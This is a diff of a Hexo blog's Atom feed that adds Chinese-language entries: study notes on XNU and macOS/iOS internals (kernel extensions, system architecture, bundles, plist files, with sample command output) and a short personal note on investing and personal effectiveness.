@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2017-03-09T16:45:55.000Z</updated>
+  <updated>2017-03-15T04:05:10.000Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -16,11 +16,396 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>XNU内核设计--Kext内核扩展</title>
+    <link href="http://yoursite.com/2017/03/15/XNU%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1-Kext%E5%86%85%E6%A0%B8%E6%89%A9%E5%B1%95/"/>
+    <id>http://yoursite.com/2017/03/15/XNU内核设计-Kext内核扩展/</id>
+    <published>2017-03-15T03:52:11.000Z</published>
+    <updated>2017-03-15T04:05:10.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
+<hr>
+<blockquote>
+<p>《深入解析MAC OS X &amp; iOS 操作系统》- 第 十八 章: 内核扩展模块</p>
+</blockquote>
+<a id="more"></a>
+<h3 id="重点知识"><a href="#重点知识" class="headerlink" title="重点知识"></a>重点知识</h3><h3 id="设计框架"><a href="#设计框架" class="headerlink" title="设计框架"></a>设计框架</h3><h4 id="源代码分析"><a href="#源代码分析" class="headerlink" title="源代码分析"></a>源代码分析</h4><h3 id="Case"><a href="#Case" class="headerlink" title="Case"></a>Case</h3><h3 id="相关工具"><a href="#相关工具" class="headerlink" title="相关工具"></a>相关工具</h3><p>kextstat 查看系统当前加载的 kext。（/System/Library/Extensions下的 kext 不一定全部加载了）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">blog git:(master) ✗ kextstat</div><div class="line">Index Refs Address            Size       Wired      Name (Version) UUID &lt;Linked Against&gt;</div><div class="line">    1   94 0xffffff7f80a46000 0x9d30     0x9d30     com.apple.kpi.bsd (16.4.0) 548007FE-B217-4499-8640-238BC24F4A17</div><div class="line">    2    8 0xffffff7f80e59000 0x3940     0x3940     com.apple.kpi.dsep (16.4.0) 38FEF282-1288-42F3-8E55-EDD04053B20B</div><div class="line">    3  119 0xffffff7f80a04000 0x21040    0x21040    com.apple.kpi.iokit (16.4.0) EA3A39EE-499F-44C3-88F2-334FEB308226</div><div class="line">    4  126 0xffffff7f80a26000 0xd200     0xd200     com.apple.kpi.libkern (16.4.0) 677B5452-B294-43D3-A562-F13502C04C54</div><div class="line">    5  114 0xffffff7f80a00000 0x3dd0     0x3dd0     com.apple.kpi.mach (16.4.0) 2A128386-C535-4026-B9D7-E91D3360CEF4</div><div class="line">    6   62 0xffffff7f80a34000 0xba10     0xba10     com.apple.kpi.private (16.4.0) F8C31C2F-2831-4680-90DF-97A2EA6DE9F0</div><div class="line">    7   76 0xffffff7f80a40000 0x5890     0x5890     com.apple.kpi.unsupported (16.4.0) C8C39C9E-83FE-4274-BA90-9535845EFF9C</div><div class="line">    8    7 0xffffff7f80e60000 0xa9000    0xa9000    com.apple.kec.corecrypto (1.0) 25C67059-A2B6-328F-BCCF-F81CC7FFC10F &lt;7 6 5 4 3 1&gt;</div><div class="line">    9    0 0xffffff7f80fbb000 0xf000     0xf000     com.apple.kec.pthread (1) 479F2E9E-1F15-3D76-A407-DB04C1277527 &lt;7 6 5 4 1&gt;</div><div class="line">   10    1 0xffffff7f80ff1000 0xb000     0xb000     com.apple.kec.Libm (1) 51D82C5F-0248-334D-ADC6-5861BBB83C97 &lt;4&gt;</div><div class="line">   11   27 0xffffff7f80ffc000 0x9000     0x9000     com.apple.iokit.IOACPIFamily (1.4) 4F7FB6AD-2498-3F71-827C-ED7AA4BF2511 &lt;7 6 4 3&gt;</div><div class="line">   12   30 0xffffff7f80b32000 0x34000    0x34000    com.apple.iokit.IOPCIFamily (2.9) 57960DC6-4099-31BC-9B47-52CD647779C7 &lt;7 6 5 4 3&gt;</div><div class="line">   13    2 0xffffff7f831d7000 0x60000    0x60000    com.apple.driver.AppleACPIPlatform (5.0) 867C81BE-EA01-3A65-89F4-06D78E6514CA &lt;12 11 7 6 5 4 3 1&gt;</div><div class="line">   14    1 0xffffff7f812ae000 0xb000     0xb000     com.apple.driver.AppleFDEKeyStore (28.30) EA5D0966-E8EA-337A-98EB-195806E8F723 &lt;8 7 6 5 4 3 1&gt;</div><div class="line">   15    4 0xffffff7f816a9000 0x7000     0x7000     com.apple.iokit.IOReportFamily (31) B14DC3D3-7250-3DA3-BF50-C666EBEDAF4C &lt;5 4 3&gt;</div><div class="line">   16    7 0xffffff7f80a50000 0x27000    0x27000    com.apple.iokit.IOStorageFamily (2.1) 3238C6A2-A948-378E-9C53-3883089C1B52 &lt;7 6 5 4 3 1&gt;</div><div class="line">   17    0 0xffffff7f81779000 0x190</div></pre></td></tr></table></figure></p>
+<p>第1列 Index是 kext 在表中的索引<br>第2列 Refs 显示当前 kext 依赖的 kext 的个数，每一项末尾尖括号&lt;&gt;内是依赖的 kext 的index。</p>
+<p>从依赖关系树状图可以看出，树根部是1-7这7个 kext（kpi.*）</p>
+<h3 id="关联章节"><a href="#关联章节" class="headerlink" title="关联章节"></a>关联章节</h3><h3 id="Dictionary"><a href="#Dictionary" class="headerlink" title="Dictionary"></a>Dictionary</h3><h3 id="Change-Log"><a href="#Change-Log" class="headerlink" title="Change Log"></a>Change Log</h3><table>
+<thead>
+<tr>
+<th>Time</th>
+<th>Change</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>2017-xx-xx</td>
+<td>增加5.5 节</td>
+</tr>
+</tbody>
+</table>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;blockquote&gt;
+&lt;p&gt;《深入解析MAC OS X &amp;amp; iOS 操作系统》- 第 十八 章: 内核扩展模块&lt;/p&gt;
+&lt;/blockquote&gt;
+    
+    </summary>
+    
+      <category term="读书" scheme="http://yoursite.com/categories/%E8%AF%BB%E4%B9%A6/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>3月逻辑思维</title>
+    <link href="http://yoursite.com/2017/03/15/3%E6%9C%88%E9%80%BB%E8%BE%91%E6%80%9D%E7%BB%B4/"/>
+    <id>http://yoursite.com/2017/03/15/3月逻辑思维/</id>
+    <published>2017-03-15T02:50:08.000Z</published>
+    <updated>2017-03-15T04:50:21.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
+<hr>
+<p>阅读+记录<br><a id="more"></a></p>
+<h3 id="关键词：投资"><a href="#关键词：投资" class="headerlink" title="关键词：投资"></a>关键词：投资</h3><p>几大误区汇总：<br>贵金属，大宗商品在短期投资浮动交大，但是长期的利润很低。<br>买黄金避险一定要买实物黄金，而不是纸面的符号。<br>买基金理财公司（基金经历）掠夺的报酬非常高，并且他们的判断力并不准确。</p>
+<hr>
+<h3 id="关键词：活力"><a href="#关键词：活力" class="headerlink" title="关键词：活力"></a>关键词：活力</h3><p>在日本同一年龄段的人他们的收入是差不多的。大家彼此心知肚明。<br>这样的社会既没有明显的不公平，也没有明显的机会。<br>人人都没有妄念的社会是一个丧失活力的社会？</p>
+<hr>
+<h3 id="关键词：效果"><a href="#关键词：效果" class="headerlink" title="关键词：效果"></a>关键词：效果</h3><p>举例：去旅游到底是精密计划的团队旅游，还是定一个大体的目标，然后就出发，在路上根据随时的性质及时调整，跟随偶发的体验和奇遇更有效果？<br>案例中的效果的含义概括成几个词：快乐、减压、刺激、印象深刻。</p>
+<p>时间管理并不等于个人管理。时间管理顶多是让你避免浪费时间，但是不能保障你处于最好的状态。<br><strong>追求效果，而不是追求效率</strong> 管理首先就是要去掉一切不创造价值的环节。<br>我们做个人管理的时候，一定要以效果作为目标，与此同时要管理能量，而不是管理时间。</p>
+<h4 id="一句提醒自己的话："><a href="#一句提醒自己的话：" class="headerlink" title="一句提醒自己的话："></a>一句提醒自己的话：</h4><pre><code>我现在做的是不是只是让自己在电梯上多走几圈，是不是正在一个高效率的实际上 低效率或者无效率的状态里头？
+</code></pre><h4 id="彩蛋"><a href="#彩蛋" class="headerlink" title="彩蛋"></a>彩蛋</h4><p>小团队的行为模式：目标–行动–反馈–调整</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;阅读+记录&lt;br&gt;
+    
+    </summary>
+    
+      <category term="生活" scheme="http://yoursite.com/categories/categories-life/"/>
+    
+    
+      <category term="逻辑思维" scheme="http://yoursite.com/tags/%E9%80%BB%E8%BE%91%E6%80%9D%E7%BB%B4/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>XNU内核设计--基础篇</title>
+    <link href="http://yoursite.com/2017/03/13/XNU%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1-%E5%9F%BA%E7%A1%80%E7%AF%87/"/>
+    <id>http://yoursite.com/2017/03/13/XNU内核设计-基础篇/</id>
+    <published>2017-03-13T05:47:55.000Z</published>
+    <updated>2017-03-15T07:33:11.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
+<hr>
+<a id="more"></a>
+<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
+<hr>
+<blockquote>
+<p>《深入解析MAC OS X &amp; iOS 操作系统》- 第 二 章: 合众为一：OSX &amp; iOS 使用的技术</p>
+</blockquote>
+<!---more-->
+<h2 id="重点知识"><a href="#重点知识" class="headerlink" title="重点知识"></a>重点知识</h2><p>本章重点介绍 <strong>架构设计原则</strong> 和 <strong>基础模块构建</strong>。</p>
+<p><img src="/include/img/bk-xnu/arch1.png" alt=""></p>
+<p>架构采用4层架构: 用户体验层 –&gt; Darwin。<br>基础模块: 突出架构中的核心；会从4层架构中抽取来介绍的模块： Darwin、bundle、应用 APP、用户体验层–Aqua/QuickLook/Spotlight 等。</p>
+<h2 id="OSX-amp-iOS框架设计"><a href="#OSX-amp-iOS框架设计" class="headerlink" title="OSX &amp; iOS框架设计"></a>OSX &amp; iOS框架设计</h2><p><img src="/include/img/bk-xnu/arch2.png" alt=""><br>IOS/OSX 4层架构.</p>
+<p>上面3 层闭源，Darwin 是开源的。</p>
+<p>darwin 的层次 &amp;&amp; 架构</p>
+<ol>
+<li>层次</li>
+</ol>
+<p><img src="/include/img/bk-xnu/xnu-arch.jpg" alt=""></p>
+<p>darwin -&gt; xnu (混合内核) -&gt; bsd （POSIX标准） -&gt; mach (微内核) + iokit 组件</p>
+<ol>
+<li>架构<br><img src="/include/img/bk-xnu/arch3.png" alt=""></li>
+</ol>
+<p>Object-C 编写的 app 只需 要使用框架Cocoa的 接口。</p>
+<h2 id="组件-模块"><a href="#组件-模块" class="headerlink" title="组件/模块"></a>组件/模块</h2><p>组件中也包含了框架，因为每个组件自身存在框架，并且组件之间的联系也是系统框架（指 OSX/iOS系统）的一部分。</p>
+<h3 id="用户体验层"><a href="#用户体验层" class="headerlink" title="用户体验层"></a>用户体验层</h3><p>主要包括一下组件(介绍 osx+ios 对应的组件):</p>
+<ul>
+<li>Aqua</li>
+<li>Quick look</li>
+<li>spotlight</li>
+<li>Accessibility 选项</li>
+</ul>
+<h4 id="Aqua-–-OSX-GUI"><a href="#Aqua-–-OSX-GUI" class="headerlink" title="Aqua – OSX GUI"></a>Aqua – OSX GUI</h4><p>有2条流水线 （是顺序执行的关系）：<br>【1】开启GUI<br>由launchd 启动 -&gt; WindowServer -&gt; …-&gt; CGXServer fork 子进程</p>
+<p>【2】启动交互式登录<br>launchd -&gt; LoginWindow 进程</p>
+<p>模块所在 路径<br><code>/System/Library/Frameworks/ApplicationServices.framework/Frameworks/CoreGraphics.framework/Resources/WindowServer</code></p>
+<h4 id="Quick-look-–-预览"><a href="#Quick-look-–-预览" class="headerlink" title="Quick look – 预览"></a>Quick look – 预览</h4><p>采用插件扩展架构，大部分工作由插件完成。</p>
+<p>插件的文件格式 后缀<strong>.qlgenerator</strong>的 bundle.</p>
+<p>插件的组成：特殊编译的二进制程序 + 配置文件<br>特殊编译的二进制程序 的入口点不是 main 而是 QuickLookGeneratorPluginFactory 入口点。<br>配置文件：将 插件和对应的文件类型关联起来。</p>
+<p>文件类型 是什么？<br>UTI (Uniform Type Identifier)？ 逆 DNS 表示法？</p>
+<p>quicklookd “QuickLook 服务器”， 通过 /System/Library/。。。。/com.apple.quicklook.plist 文件在登录时启动。</p>
+<p>工具：<br>qlmanage 插件管理工具，控制后台服务。</p>
+<p>使用工具<br>qlmanage -m</p>
+<p><img src="/include/img/bk-xnu/qlmanage.png" alt="qlmanage"><br>qlmanage  显示 管理的插件（入口，文件，版本）</p>
+<h4 id="spotlight-–-快速搜索工具"><a href="#spotlight-–-快速搜索工具" class="headerlink" title="spotlight – 快速搜索工具"></a>spotlight – 快速搜索工具</h4><p>其核心是一个 mds 索引服务器，记录了系统所有文件（支持的文件类型）的 元数据。<br>在 创建、修改 和删除 事件发生时，内核通知 mds。 通知机制是 fsevents。</p>
+<p>mds 负责接受消息，具体干活的是 mdworker 进程，负责将各种元数据信息导入数据库。<br>mdworker 可以加载 spotlight importer 导入器从文件中 提取元数据。</p>
+<p>导入器 有系统提供的在 /System/Library/Spotlight 目录，也有用户自定义的在/Library/Spotlight/。</p>
+<p>演示 使用 xcode 创建 spotlight 导入器工程<br><img src="/include/img/bk-xnu/importer.png" alt="importer"><br><img src="/include/img/bk-xnu/importerdev.png" alt="importer"></p>
+<p>工具：</p>
+<ul>
+<li>mdutil</li>
+<li>mdfind</li>
+<li>mdimport</li>
+<li>mdls</li>
+<li>mdcheckschema</li>
+<li>mddiagnose</li>
+</ul>
+<h3 id="Darwin-–-UNIX-核心"><a href="#Darwin-–-UNIX-核心" class="headerlink" title="Darwin – UNIX 核心"></a>Darwin – UNIX 核心</h3><p>OSX 开启 ssh<br>通过修改 /System/Library/LaunchDaemons 中的 plist （ssh.plist），将 Disabled 设置为 false.<br>ios 需要越狱后 单独安装 ssh, 并且默认有2个用户，root 和 mobile 。 root 默认密码 alpine。</p>
+<h4 id="HFS-文件系统"><a href="#HFS-文件系统" class="headerlink" title="HFS+ 文件系统"></a>HFS+ 文件系统</h4><p> 此文件系统 可以细分为4个类型：</p>
+<ul>
+<li>大小写敏感：此时 采用 HFSX 文件系统，是 iOS 上默认的文件系统。</li>
+<li>不敏感：OSX 采用此类 文件系统</li>
+<li>支持日志功能：此时 采用 JHFS 文件系统，日志文件系统 通过一个日志记录文件 系统任务执行状态，相当于一个快照，文件系统挂载时 可以去查找 日志。</li>
+<li>不支持日志功能：</li>
+</ul>
+<p>从类型名称 就可以知道其区别，注意 大小写敏感文件系统显示 和 访问时的现象。</p>
+<p>显示：不管大小写是否 敏感，都采用创建时的方式显示。<br>访问：大小写不敏感就可以 随意使用 大小写 。比如 LS/ETC 。。命令， 铭感的文件系统 就要区分大小写。</p>
+<p>开发时是使用的 API 并不是 HFS+文件系统直接提供，而是由 虚拟文件交换系统 VFS 提供。VFS 是内核中使用的所有文件系统的统一接口。<br>VFS 的特性：同时支持 UNIX 文件系统和 外部文件系统。</p>
+<h3 id="UNIX-系统目录"><a href="#UNIX-系统目录" class="headerlink" title="UNIX 系统目录"></a>UNIX 系统目录</h3><h4 id="OSX-中-UNIX-的目录"><a href="#OSX-中-UNIX-的目录" class="headerlink" title="OSX 中 UNIX 的目录"></a>OSX 中 UNIX 的目录</h4><hr>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">/bin/</div><div class="line">/sbin/       系统程序</div><div class="line">/usr/        安装第三方软件</div><div class="line">/etc/</div><div class="line">/dev         BSD 设备文件</div><div class="line">/tmp         临时文件</div><div class="line">/var         杂项文件</div></pre></td></tr></table></figure>
+<h4 id="OSX-中-特殊的目录"><a href="#OSX-中-特殊的目录" class="headerlink" title="OSX 中 特殊的目录"></a>OSX 中 特殊的目录</h4><hr>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">Applications/</div><div class="line">Developer/</div><div class="line">Volumes/</div><div class="line">Library/</div><div class="line">System/         系统文件。包含了系统中所有重要的组件，如框架--/System/Library/Frameworks，内核模块--/System/Library/Extensions</div><div class="line">Users/</div><div class="line">/Core           核心转储文件。如果 ulimit() 命令允许创建 核心转储文件，那么当进程奔溃时会创建。包含了进程的核心虚拟内存镜像。</div></pre></td></tr></table></figure>
+<h4 id="iOS-中-目录-amp-与-OSX-的目录区别"><a href="#iOS-中-目录-amp-与-OSX-的目录区别" class="headerlink" title="iOS 中 目录 &amp; 与 OSX 的目录区别"></a>iOS 中 目录 &amp; 与 OSX 的目录区别</h4><hr>
+<p>iOS 内核镜像和 OSX 的区别：</p>
+<p>除了上面介绍的文件系统的区别，内核镜像上也存在差异。</p>
+<p>iOS 的内核以 kernelcache 的形式将内核扩展 打包在内核中。（kernelcache 在/System/Library/Caches/com.apple.kernelcaches中）。<br>iOS 内核缓存是加密的 Img3文件。</p>
+<p>相关章节：<br>5、18 章</p>
+<h3 id="bundle"><a href="#bundle" class="headerlink" title="bundle"></a>bundle</h3><p>bundle 在 OSX 中有多种解释，不再只是 一种文件格式类型，bundle 同时表示一种 <strong>目录结构</strong>（也称为”包 （package）”）。</p>
+<p>bundle 在 OSX 中应用在: 框架、插件、widget、内核扩展中，这些组件都被打包成 bundle。</p>
+<p>bundle 中包含了 代码、配置文件（plist）、资源文件。</p>
+<h3 id="应用程序和-app"><a href="#应用程序和-app" class="headerlink" title="应用程序和 app"></a>应用程序和 app</h3><p>GUID 目录名？？<br>在 iOS app 运行时会被 chroot 到自己的应用目录下 – 名字为GUID的目录–并且不能逃脱这个目录访问文件系统的其他目录。<br>应用程序会将  自己GUID名字的目录当做根目录，因此需要创建临时目录时，/tmp 指向 GUID/tmp.</p>
+<table>
+<thead>
+<tr>
+<th>ios app 标准目录下的文件/目录</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Documents</td>
+<td>应用数据</td>
+</tr>
+<tr>
+<td>iTunesArtwork</td>
+<td>app 的图标，一般是 JPG 文件</td>
+</tr>
+<tr>
+<td>iTunesMetaData.plist</td>
+<td>app的属性列表文件，二进制的 plist 文件</td>
+</tr>
+<tr>
+<td>Library/</td>
+<td>杂项文件，包括 Caches、Cookies、Preferences、WebKit</td>
+</tr>
+<tr>
+<td>tmp</td>
+<td>临时文件目录</td>
+</tr>
+</tbody>
+</table>
+<h4 id="OSX-上的应用格式"><a href="#OSX-上的应用格式" class="headerlink" title="OSX 上的应用格式"></a>OSX 上的应用格式</h4><p>非常标准的 bundle 格式存储文件</p>
+<h4 id="iOS-应用格式"><a href="#iOS-应用格式" class="headerlink" title="iOS 应用格式"></a>iOS 应用格式</h4><p>混乱的 app 格式。<br><code>ll ~/Music/iTunes/iTunes\ Media/Mobile\ Applications</code></p>
+<p>从 APP Store 下载应用时，应用以.ipa 文件的形式打包–实际就是 zip 文件。</p>
+<h4 id="info-plist-文件"><a href="#info-plist-文件" class="headerlink" title="info.plist 文件"></a>info.plist 文件</h4><p>首先 介绍这个最重要的文件， 此文件相当于 android apk 里的 Manifest.xml。<br>此文件 记录了 bundle 的配置信息、依赖关系和其他属性。</p>
+<p>plist 文件的格式，系统支持3种格式的 plist。分别是：XML/JSON/二进制格式–BPlists。<br>除了 JSON使用的较少，其他2种较常见。</p>
+<p>工具：plutil 可以将 plist 转换成 不同的格式。<br><code>plutil -convert xml1  --o - &lt;Info.plist&gt; output.Info.plist</code></p>
+<p>plist 的内容(p28)：</p>
+<table>
+<thead>
+<tr>
+<th>Key</th>
+<th>描述/Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CFBundleDisplayName</td>
+<td>显示给用户的 Bundle 名称</td>
+</tr>
+<tr>
+<td>。。</td>
+<td>。。</td>
+</tr>
+</tbody>
+</table>
+<p>列表中所有的 key 都是 CF 开发，表示这些 key 由 Core Foundation框架定义并处理。</p>
+<p>类似的：Cocoa app 包含 NS 开头的 key, NSxxx定义的功能包括：是否允许脚本操作、Java需要、系统偏好设置等等。大部分 NSxxx 只能用于 OSX 不能在 iOS上使用。</p>
+<h4 id="其他格式的文件"><a href="#其他格式的文件" class="headerlink" title="其他格式的文件"></a>其他格式的文件</h4><p>这些文件在 Resources 目录下。</p>
+<ol>
+<li>NIB 文件， 后缀是.nib。该文件是二进制的 plist 文件，其中保存了应用程序的 GUI 组件的位置和设置信息。</li>
+<li>lproj 文件， 后缀是.lproj。 支持国际化的文件，每种语言对应一个.lproj 的文件。</li>
+<li>icns 图标文件</li>
+<li>CodeResources文件，签过文件。 这是一个符号链接，指向_CodeSignature/CodeResources。此文件包含 bundle 中所有其他文件的列表。 key是文件名，valuse 是文件的 bash64.</li>
+</ol>
+<h4 id="加载默认应用程序"><a href="#加载默认应用程序" class="headerlink" title="加载默认应用程序"></a>加载默认应用程序</h4><p>当点击一个 文件时，系统会自动使用某个 APP 打开程序。实现文件类型 和默认应用程序的绑定是由 LaunchServices 框架实现（次框架和 launchd 没有关系），此框架是 CoreServices 框架的一部分。</p>
+<p><code>/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/</code></p>
+<p>使用 LaunchServices 提供的工具 lsregister 可以查看文件类型的注册信息。<br><code>cd /System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/</code><br><code>./lsregister -dump</code></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line">➜  Support  ./lsregister -dump | more</div><div class="line">    Checking data integrity......done.</div><div class="line">    Status: Database is seeded.</div><div class="line">    Status: Preferences are loaded.</div><div class="line">    Seeded System Version: 10.12.3 (16D32)</div><div class="line">    CacheGUID: 9E923EE5-DAEF-44B8-8B13-3EAAFDB11DEF</div><div class="line">    CacheSequenceNum: 8712</div><div class="line">    Path: /var/folders/fj/5bqzvxbd15s86mvc3kc44ypw0000gn/0/com.apple.LaunchServices-175-v2.csstore</div><div class="line">    DB Object: <span class="tag">&lt;<span class="name">LSDatabase</span> <span class="attr">0x7fd904800000</span>&gt;</span> &#123; path = '/var/folders/fj/5bqzvxbd15s86mvc3kc44ypw0000gn/0/com.apple.LaunchServices-175-v2.csstore' &#125;</div><div class="line">    Store Object: <span class="tag">&lt;<span class="name">CSStore</span> <span class="attr">0x7fd902f00da0</span>&gt;</span> &#123; p = 0x10d800000, length = 6508544/6506368/6484712 &#125;</div><div class="line">    +++++++++++++++++++++ MEMORY USAGE +++++++++++++++++++++</div><div class="line">    sizeof(Data):                  100 ( 100 bytes) --------</div><div class="line">    sizeof(Table):                  80 (  80 bytes) --------</div><div class="line">    sizeof(Unit):                    8 (   8 bytes) --------</div><div class="line">    sizeof(IdentifierCache):         4 (   4 bytes) --------</div><div class="line">    ++++++++++++++++++++++++++++++++++++++++++++++++++++++++</div><div class="line">    Data:                      2222152 (    2.2 MB)   8397 u</div><div class="line">    Container:                     288 ( 288 bytes)      8 u</div><div class="line">    HandlerPref:                  5000 (      5 KB)     50 u</div><div class="line">    BindableKeyMap:             130576 (    131 KB)      1 u</div><div class="line">    PluginProtocolBinding:        4096 (      4 KB)      1 u</div><div class="line">    Type:                       147288 (    147 KB)   1938 u</div><div class="line">    UTIBinding:                  32656 (     33 KB)      1 u</div><div class="line">    Bundle:                     449152 (    449 KB)   1276 u</div><div class="line">    Alias:                     1352372 (    1.4 MB)   1383 u</div><div class="line">    PluginUUIDBinding:            4096 (      4 KB)      1 u</div><div class="line">    Service:                      5616 (      6 KB)    108 u</div><div class="line">    ActivityTypeBinding:         32656 (     33 KB)      1 u</div><div class="line">    String:                     261136 (    261 KB)      1 u</div><div class="line"></div><div class="line">...</div><div class="line">    Container mount state: mounted</div><div class="line">bundle  id:            5164</div><div class="line">        Mach-O UUIDs:  75CF346E-BF45-3B11-A064-5A90985162E9</div><div class="line">        sequenceNum:   5164</div><div class="line">        FamilyID:      0</div><div class="line">        PurchaserID:   0</div><div class="line">        DownloaderID:  0</div><div class="line">        installType:   0</div><div class="line">        appContainer:  #</div><div class="line">        dataContainer: #</div><div class="line">        path:          /private/var/folders/fj/5bqzvxbd15s86mvc3kc44ypw0000gn/C/com.apple.DeveloperTools/All/Xcode/EmbeddedAppDeltas/HelloWorld-OC.app.xDWFUc/HelloWorld-OC.app_sparse.ipa/Payload/HelloWorld-OC.app</div><div class="line">        name:          HelloWorld-OC</div><div class="line">        displayName:   (null)</div><div class="line">        itemName:      (null)</div><div class="line">        teamID:        VYDSDANL33</div><div class="line">        staticSize:    0</div><div class="line">        storeFront:    0</div><div class="line">        versionID:     0</div><div class="line">        sourceAppID:   (null)</div><div class="line">        ratingLabel:   (null)</div><div class="line">        ratingRank:    0</div><div class="line">        category:      (null)</div><div class="line">        2ry category:  (null)</div><div class="line">        ....</div></pre></td></tr></table></figure>
+<h3 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h3><p>框架也是一种 bundle 格式。框架是不可移植的，是苹果系统特有的。大部分框架是闭源的，框架提供了完整的运行时接口，隐藏底层的系统和库。</p>
+<p>框架的内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">CodeResources/</div><div class="line">Headers -&gt; Versions/Current/Headers</div><div class="line">IOKit -&gt; Versions/Current/IOKit</div><div class="line">Resources -&gt; Versions/Current/Resources</div><div class="line">Versions/</div><div class="line">XPCServices -&gt; Versions/Current/XPCServices</div><div class="line">module.map</div><div class="line">Current/                框架首选的版本的符号链接</div><div class="line">framework-name          框架首选的二进制文件的符号链接</div></pre></td></tr></table></figure></p>
+<p>OSX 和 iOS 的 GCC 支持 -framework 选项，此选项可以包含任何依赖的框架（第三方框架+系统框架）。<br>此选项 可以指向头文件 或者 库文件。</p>
+<p>框架搜索路的环境变量：</p>
+<p>框架保存的位置：</p>
+<ul>
+<li>/System/Library/Frameworks/  系统框架</li>
+<li>/Library/Frameworks   第三方框架</li>
+<li>~/Library/Frameworks  用户提供的框架</li>
+</ul>
+<h4 id="重要的框架"><a href="#重要的框架" class="headerlink" title="重要的框架"></a>重要的框架</h4><ol>
+<li>Cocoa: 首选的应用程序编程环境<br>支持的语言：Object-C, java, AppleSCript。</li>
+</ol>
+<p>位置： <code>/System/Library/Frameworks/Cocoa.framework/</code></p>
+<p>此框架依赖于：Foundation、AppKit、CoreData<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Versions/Current/Headers/Cocoa.h</div><div class="line"></div><div class="line"><span class="meta">#import <span class="meta-string">&lt;Foundation/Foundation.h&gt;</span></span></div><div class="line"><span class="meta">#import <span class="meta-string">&lt;AppKit/AppKit.h&gt;</span></span></div><div class="line"><span class="meta">#import <span class="meta-string">&lt;CoreData/CoreData.h&gt;</span></span></div></pre></td></tr></table></figure></p>
+<p>保护伞框架（umbrella）：封装了其他框架的框架。<br>封装有2种：</p>
+<ol>
+<li>只是 #import 。 如 Cocoa</li>
+<li>嵌套了其他框架。 如 Application Service</li>
+</ol>
+<p>2.Carbon: OS9 遗留编程接口的名称</p>
+<p>MAC OSX 和 iOS的公共框架列表</p>
+<blockquote>
+<p>表2-2 (p35)</p>
+</blockquote>
